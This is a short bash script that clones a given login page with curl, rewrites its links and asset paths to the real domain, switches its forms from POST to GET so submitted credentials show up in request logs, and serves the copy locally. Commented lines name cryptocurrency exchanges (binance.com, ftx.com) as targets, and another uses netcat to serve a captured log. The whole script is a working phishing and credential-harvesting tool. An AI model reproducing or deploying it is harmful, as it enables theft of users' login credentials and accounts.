#!/bin/bash
rm mirror.html m.html
if [ $# != 2 ]
then
    echo "usage: $0 <domain_url> <login_url>"
    exit 0
fi

curl -s $2 > mirror.html
cp mirror.html m.html

sed -i "s/href=\"\//href=\"https:\/\/$1\//g" m.html
sed -i "s/src=\"\//src=\"https:\/\/$1\//g" m.html
#sed -i "s/href=\"\//href=\"https:\/\/binance.com\//g" m.html
#sed -i "s/src=\"\//src=\"https:\/\/ftx.com\//g" m.html
sed -i "s/post/get/gi" m.html
sed -i "s/<form /<form method=\"GET\"/g" m.html
sed -i "s/url(\//url(\https:\/\/$1\//g" m.html
echo 'mirror is listening at http://localhost:8080'
node mirror.js
#nc -lvp $1 -c 'grep -q "GET /" && echo "Content-Type: text/html; charset=UTF-8\r\nServer: Microsoft-IIS/10.0\r\n\r\n" | echo "$(cat mirror.log)"'
